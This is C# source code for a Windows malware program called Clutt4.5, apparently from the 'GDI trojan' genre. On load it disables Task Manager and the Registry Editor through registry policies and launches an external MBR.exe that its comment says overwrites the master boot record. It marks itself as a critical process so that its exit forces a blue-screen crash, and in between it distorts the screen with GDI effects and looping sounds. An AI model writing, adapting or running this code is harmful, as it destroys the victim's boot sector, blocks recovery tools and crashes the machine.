using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Windows;
using System.Threading;
using System.Media;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;

namespace Clutt4._5
{
    public partial class Clutt4_5 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll", ExactSpelling = true)]
        private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, 
        int ySrc, TernaryRasterOperations dwRop);

        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

        [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
        static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int xP1, int yP1, int wP2, int hP2, TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(uint RGB);

        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hwnd);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        int isCritical = 1;  // we want this to be a Critical Process
        int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

        private SoundPlayer shake_snd, color_snd, rainbow_snd, light_snd, dark_snd, glitch, glitch1, 
        glitch2, glitch3, glitch4, glitch5, saw_snd, scrase_snd;

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020, // dest = source
            SRCPAINT = 0x00EE0086, // dest = source OR dest
            SRCAND = 0x008800C6, // dest = source AND dest
            SRCINVERT = 0x00660046, // dest = source XOR dest
            SRCERASE = 0x00440328, // dest = source AND (NOT dest)
            NOTSRCCOPY = 0x00330008, // dest = (NOT source)
            NOTSRCERASE = 0x001100A6, // dest = (NOT src) AND (NOT dest)
            MERGECOPY = 0x00C000CA, // dest = (source AND pattern)
            MERGEPAINT = 0x00BB0226, // dest = (NOT source) OR dest
            PATCOPY = 0x00F00021, // dest = pattern
            PATPAINT = 0x00FB0A09, // dest = DPSnoo
            PATINVERT = 0x005A0049, // dest = pattern XOR dest
            DSTINVERT = 0x00550009, // dest = (NOT dest)
            BLACKNESS = 0x00000042, // dest = BLACK
            WHITENESS = 0x00FF0062, // dest = WHITE
            hmm = 0x00100C85
        };

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }

        }

        //
        Random r;

        //bools
        bool small_shake = true;
        bool color_filter = false;
        bool rainbow_rect = false;
        bool snd_color = false;
        bool flip_screen = false;
        bool flip2_screen = false;
        bool snd_rainbow = false;
        bool snd_shake = false;
        bool red_screen = true;
        bool snd_dark = false;
        bool clear = true;
        bool tunel = false;
        bool shake = false;
        bool BSOD_bool = false;
        bool snd_saw = false;
        bool flip180_screen = false;
        bool scrand_screen = false;
        bool light_screen = false;
        bool snd_light = false;
        bool icon_draw = false;
        bool snd_scrase = false;
        int x2 = 0;
        int y2 = 0;
        bool x2right = true;
        bool remove_screen = false;
        bool puzzle = false;
        //
        int x = Screen.PrimaryScreen.Bounds.Width;
        int y = Screen.PrimaryScreen.Bounds.Height;

        public Clutt4_5()
        {
            InitializeComponent();
            TransparencyKey = BackColor;
            try
            {
                shake_snd = new SoundPlayer(@"C:\Windows\shakepcm.wav");
                color_snd = new SoundPlayer(@"C:\Windows\colorpcm.wav");
                rainbow_snd = new SoundPlayer(@"C:\Windows\rainbowpcm.wav");
                light_snd = new SoundPlayer(@"C:\Windows\lightpcm.wav");
                dark_snd = new SoundPlayer(@"C:\Windows\darkpcm.wav");
                glitch = new SoundPlayer(@"C:\Windows\glitchpcm.wav");
                glitch2 = new SoundPlayer(@"C:\Windows\glitch2pcm.wav");
                glitch3 = new SoundPlayer(@"C:\Windows\glitch3pcm.wav");
                glitch4 = new SoundPlayer(@"C:\Windows\glitch4pcm.wav");
                glitch5 = new SoundPlayer(@"C:\Windows\glitch5pcm.wav");
                saw_snd = new SoundPlayer(@"C:\Windows\tunelpcm.wav");
                scrase_snd = new SoundPlayer(@"C:\Windows\scrasepcm.wav");
            }
            catch(Exception ex) { }
        }

        private void Clutt4_5_Load(object sender, EventArgs e)
        {
            reg(); //registry keys
            MBR(); //overwrite master boot sector (MBR)
            gdi(); //draw on desktop icons, invert colors, tunnel effect...
            BSOD_set(); //set blue screen of death
        }

        public void reg()
        {
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }

        public void MBR()
        {
            if (File.Exists(@"C:\Windows\MBR.exe"))
            {
                Process.Start(@"C:\Windows\MBR.exe");
            }
        }

        public void BSOD_set()
        {
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        public void BSOD()
        {
            Environment.Exit(-1);
        }

        public void gdi()
        {
            timer1.Start();
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
            r = new Random();
            if (small_shake && !remove_screen)
            {

                if (!color_filter)
                {
                    color_filter = true;
                    timer2.Start();
                }

                if (!snd_shake)
                {
                    snd_shake = true;
                    shake_snd.PlayLooping();
                }

                timer1.Stop();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                timer1.Interval = 50;
                BitBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                ReleaseDC(hwnd, hdc);
                if (r.Next(5) == 1 && !flip180_screen)
                {
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }
                timer1.Start();
            }
            else
            {
                timer1.Stop();
            }
        }

        private void timer2_Tick_1(object sender, EventArgs e)
        {
            if (color_filter && !remove_screen)
            {

                if (!snd_color && !rainbow_rect)
                {
                    snd_color = true;
                    color_snd.PlayLooping();
                }

                if (!rainbow_rect && r.Next(10) == 1)
                {
                    rainbow_rect = true;
                    timer3.Start();
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }

                timer2.Stop();
                timer2.Interval = 50;
                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                IntPtr red = CreateSolidBrush(0x0000FF);
                IntPtr blue = CreateSolidBrush(0x0050CA);
                IntPtr yellow = CreateSolidBrush(0x0160AA);
                IntPtr green = CreateSolidBrush(0x0090DD);
                IntPtr pink = CreateSolidBrush(0x0700EE);

                if (r.Next(5) == 5)
                {
                    SelectObject(hdc, red);
                    //StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(red);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 4)
                {
                    SelectObject(hdc, blue);
                    //StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(blue);
                    ReleaseDC(hwnd, hdc);
                }
                else if (r.Next(5) == 3)
                {
                    SelectObject(hdc, green);
                    //StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(green);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 2)
                {
                    SelectObject(hdc, yellow);
                    //StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(yellow);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 1)
                {
                    SelectObject(hdc, pink);
                    //StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(pink);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else
                {
                    SelectObject(hdc, green);
                    //StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(green);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                timer2.Start();
            }
        }

        private void timer3_Tick_1(object sender, EventArgs e)
        {
            if (rainbow_rect && !remove_screen)
            {
                timer3.Stop();
                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                IntPtr red = CreateSolidBrush(0x0000FF);
                IntPtr blue = CreateSolidBrush(0x0050CA);
                IntPtr yellow = CreateSolidBrush(0x0160AA);
                IntPtr green = CreateSolidBrush(0x0090DD);
                IntPtr pink = CreateSolidBrush(0x0700EE);
                timer3.Interval = 50;

                if (rainbow_rect && r.Next(10) == 1)
                {
                    PatBlt(hdc, r.Next(x), r.Next(y), r.Next(x), r.Next(y), TernaryRasterOperations.PATINVERT);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }

                if (!snd_rainbow)
                {
                    snd_rainbow = true;
                    rainbow_snd.PlayLooping();
                }

                if (!flip_screen && r.Next(10) == 1)
                {
                    flip_screen = true;
                    timer4.Start();
                }

                if (r.Next(5) == 5)
                {
                    SelectObject(hdc, red);
                    StretchBlt(hdc, 1, r.Next(y), x, y - r.Next(y), hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(red);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 4)
                {
                    SelectObject(hdc, blue);
                    StretchBlt(hdc, 1, r.Next(y), x, y - r.Next(y), hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(blue);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 3)
                {
                    SelectObject(hdc, green);
                    StretchBlt(hdc, 1, r.Next(y), x, y - r.Next(y), hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(green);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 2)
                {
                    SelectObject(hdc, yellow);
                    StretchBlt(hdc, 1, r.Next(y), x, y - r.Next(y), hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(yellow);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else if (r.Next(5) == 1)
                {
                    SelectObject(hdc, pink);
                    StretchBlt(hdc, 1, r.Next(y), x, y - r.Next(y), hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                    DeleteObject(pink);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else
                {
                    if (!scrand_screen)
                    {
                        InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                    }
                }
                timer3.Start();
            }
            else
            {
                timer3.Stop();
            }
        }

        private void timer4_Tick_1(object sender, EventArgs e)
        {
            if (flip_screen && !remove_screen)
            {
                timer4.Stop();
                timer4.Interval = 100;
                if (!flip2_screen && r.Next(10) == 1)
                {
                    flip2_screen = true;
                    timer5.Start();
                }

                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);
                timer4.Start();
            }
        }

        private void timer5_Tick_1(object sender, EventArgs e)
        {
            if (flip2_screen && !remove_screen)
            {
                flip_screen = false;
                timer5.Stop();
                timer5.Interval = 100;
                if (!flip180_screen && r.Next(10) == 1)
                {
                    flip180_screen = true;
                    timer6.Start();
                }

                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);
                timer5.Start();
            }
        }

        private void timer6_Tick_1(object sender, EventArgs e)
        {
            if (flip180_screen && !remove_screen)
            {
                flip2_screen = false;
                timer6.Stop();
                timer6.Interval = 100;

                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);

                if (!scrand_screen && r.Next(20) == 1)
                {
                    scrand_screen = true;
                    timer7.Start();
                }

                timer6.Start();
            }
        }

        private void timer7_Tick_1(object sender, EventArgs e)
        {
            if (scrand_screen && !remove_screen)
            {
                if (!light_screen && r.Next(20) == 1)
                {
                    light_screen = true;
                    timer8.Start();
                }
                if (!snd_light)
                {
                    snd_light = true;
                    light_snd.PlayLooping();
                }
                timer7.Stop();
                r = new Random();
                small_shake = false;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                timer7.Interval = 10;
                StretchBlt(hdc, 1, 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);

                timer7.Start();
            }
        }

        private void timer8_Tick_1(object sender, EventArgs e)
        {
            if (!snd_scrase)
            {
                snd_scrase = true;
                scrase_snd.PlayLooping();
            }

            if (light_screen && !remove_screen)
            {
                timer8.Stop();
                timer8.Interval = 50;
                r = new Random();
                color_filter = false;
                rainbow_rect = false;
                flip180_screen = false;
                scrand_screen = false;
                if (color_filter || rainbow_rect || flip180_screen || flip2_screen || flip_screen || scrand_screen)
                {
                    timer7.Stop();
                    timer6.Stop();
                    timer5.Stop();
                    timer4.Stop();
                    timer3.Stop();
                    timer2.Stop();
                    timer1.Stop();
                    color_filter = false;
                    rainbow_rect = false;
                    flip180_screen = false;
                    flip2_screen = false;
                    flip_screen = false;
                    small_shake = false;
                    scrand_screen = false;
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                StretchBlt(hdc, r.Next(-10, 10), r.Next(-10, 10), x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCAND);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);
                if (r.Next(2) == 1)
                {
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }
                if (!icon_draw && r.Next(20) == 1)
                {
                    icon_draw = true;
                    timer9.Start();
                }

                timer8.Start();
            }
        }
        Icon warn_ico = Extract("shell32.dll", 235, true);
        Icon quest_ico = Extract("shell32.dll", 154, true);
        Icon pc_ico = Extract("shell32.dll", 232, true);
        Icon warn_shield = Extract("shell32.dll", 244, true);
        Icon no_ico = Extract("shell32.dll", 219, true);
        Icon bin_ico = Extract("shell32.dll", 64, true);
        Icon net_ico = Extract("shell32.dll", 13, true);
        IntPtr desktop = GetWindowDC(IntPtr.Zero);
        private void timer9_Tick_1(object sender, EventArgs e)
        {
            if (icon_draw)
            {
                if (!snd_dark)
                {
                    snd_dark = true;
                    dark_snd.PlayLooping();
                }

                timer9.Stop();
                if (light_screen)
                {
                    timer8.Stop();
                    timer9.Interval = 1;
                    light_screen = false;
                }
                if (!remove_screen)
                {
                    remove_screen = true;
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    if (x2 < x && y2 < y && x2right)
                    {
                        if (r.Next(9) == 8)
                        {
                            g.DrawIcon(warn_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 7)
                        {
                            g.DrawIcon(quest_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 6)
                        {
                            g.DrawIcon(pc_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 5)
                        {
                            g.DrawIcon(warn_shield, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 4)
                        {
                            g.DrawIcon(no_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 3)
                        {
                            g.DrawIcon(bin_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 2)
                        {
                            g.DrawIcon(net_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                        else
                        {
                            g.DrawIcon(warn_ico, x2 += r.Next(20, 25), y2 += 1);
                        }
                    }
                    else if (x2 > -1 && y2 < y)
                    {
                        x2right = false;
                        if (r.Next(9) == 8)
                        {
                            g.DrawIcon(warn_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 7)
                        {
                            g.DrawIcon(quest_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 6)
                        {
                            g.DrawIcon(pc_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 5)
                        {
                            g.DrawIcon(warn_shield, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 4)
                        {
                            g.DrawIcon(no_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 3)
                        {
                            g.DrawIcon(bin_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else if (r.Next(9) == 2)
                        {
                            g.DrawIcon(net_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                        else
                        {
                            g.DrawIcon(warn_ico, x2 -= r.Next(20, 25), y2 += 1);
                        }
                    }
                    else if (x2 < x && y2 < y)
                    {
                        x2right = true;
                    }
                    else
                    {
                        x2 = 0;
                        y2 = 0;
                        x2right = true;
                    }

                    if (r.Next(30) == 1 && red_screen)
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        IntPtr red = CreateSolidBrush(0x0000FF);
                        SelectObject(hdc, red);
                        StretchBlt(hdc, r.Next(-1, 1), r.Next(-1, 1), x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                        DeleteObject(red);
                        ReleaseDC(hwnd, hdc);
                        DeleteDC(hdc);
                    }
                    if (!puzzle)
                    {
                        puzzle = true;
                        timer10.Start();
                    }
                }
                timer9.Start();
            }
        }

        private void timer10_Tick_1(object sender, EventArgs e)
        {
            if (puzzle)
            {

                if (r.Next(5) == 5)
                {
                    glitch5.Play();
                    if (r.Next(5) == 5)
                    {
                        timer10.Interval = 500;
                    }
                    else if (r.Next(5) == 4)
                    {
                        timer10.Interval = 400;
                    }
                    else if (r.Next(5) == 3)
                    {
                        timer10.Interval = 300;
                    }
                    else if (r.Next(5) == 2)
                    {
                        timer10.Interval = 200;
                    }
                    if (r.Next(5) == 1)
                    {
                        timer10.Interval = 100;
                    }
                    else
                    {
                        timer10.Interval = 10;
                    }
                }
                else if (r.Next(5) == 4)
                {
                    glitch4.Play();
                    timer10.Interval = 100;
                }
                else if (r.Next(5) == 3)
                {
                    glitch3.Play();
                    timer10.Interval = 100;
                }
                else if (r.Next(5) == 2)
                {
                    glitch2.Play();
                    timer10.Interval = 100;
                }
                else
                {
                    glitch.Play();
                    timer10.Interval = 100;
                }

                timer10.Stop();
                if (clear && puzzle)
                {
                    clear = false;
                    red_screen = false;
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                    timer10.Interval = 10;
                }
                if (!shake && r.Next(20) == 1)
                {
                    shake = true;
                    timer13.Start();
                }
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(x), r.Next(y), r.Next(500), r.Next(500), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);
                if (!tunel && r.Next(20) == 1)
                {
                    tunel = true;
                    timer11.Start();
                }
                timer10.Start();
            }
        }

        private void timer11_Tick_1(object sender, EventArgs e)
        {
            if (tunel)
            {
                if (!snd_saw)
                {
                    snd_saw = true;
                    saw_snd.PlayLooping();
                }

                timer11.Stop();

                if (puzzle || icon_draw)
                {
                    timer9.Stop();
                    timer10.Stop();
                    timer13.Stop();
                    puzzle = false;
                    icon_draw = false;
                    shake = false;
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                    timer11.Interval = 1000;
                }
                if (!BSOD_bool)
                {
                    BSOD_bool = true;
                    timer14.Start();
                }
                if (timer11.Interval > 51)
                {
                    timer11.Interval -= 50;
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    StretchBlt(hdc, r.Next(15), r.Next(15), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                else
                {
                    timer11.Interval = 1;
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    StretchBlt(hdc, r.Next(15), r.Next(15), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    ReleaseDC(hwnd, hdc);
                    DeleteDC(hdc);
                }
                if (r.Next(100) == 1)
                {
                    if (r.Next(6) == 5)
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        IntPtr red = CreateSolidBrush(0x0000FF);
                        SelectObject(hdc, red);
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                        StretchBlt(hdc, 1, 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                        DeleteObject(red);
                        ReleaseDC(hwnd, hdc);
                        DeleteDC(hdc);
                    }
                    else if (r.Next(6) == 4)
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        IntPtr green = CreateSolidBrush(0xFF00FF);
                        SelectObject(hdc, green);
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                        StretchBlt(hdc, 1, 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                        DeleteObject(green);
                        ReleaseDC(hwnd, hdc);
                        DeleteDC(hdc);
                    }
                    else if (r.Next(6) == 3)
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        IntPtr yellow = CreateSolidBrush(0x9933FF);
                        SelectObject(hdc, yellow);
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                        StretchBlt(hdc, 1, 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                        DeleteObject(yellow);
                        ReleaseDC(hwnd, hdc);
                        DeleteDC(hdc);
                    }
                    else if (r.Next(6) == 2)
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        IntPtr blue = CreateSolidBrush(0xFF0000);
                        SelectObject(hdc, blue);
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                        StretchBlt(hdc, 1, 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                        DeleteObject(blue);
                        ReleaseDC(hwnd, hdc);
                        DeleteDC(hdc);
                    }
                    else if (r.Next(6) == 1)
                    {
                        IntPtr hwnd = GetDesktopWindow();
                        IntPtr hdc = GetWindowDC(hwnd);
                        IntPtr pink = CreateSolidBrush(0x00FF00);
                        SelectObject(hdc, pink);
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                        StretchBlt(hdc, 1, 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.hmm);
                        DeleteObject(pink);
                        ReleaseDC(hwnd, hdc);
                        DeleteDC(hdc);
                    }

                }
                timer11.Start();
            }
        }

        private void timer12_Tick(object sender, EventArgs e)
        {

        }

        private void timer13_Tick_1(object sender, EventArgs e)
        {
            if (shake)
            {
                timer13.Stop();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                StretchBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                ReleaseDC(hwnd, hdc);
                DeleteDC(hdc);
                timer13.Start();
            }
        }

        private void timer14_Tick_1(object sender, EventArgs e)
        {
            timer14.Stop();
            tunel = false;
            saw_snd.Stop();
            BSOD();
        }
    }
}
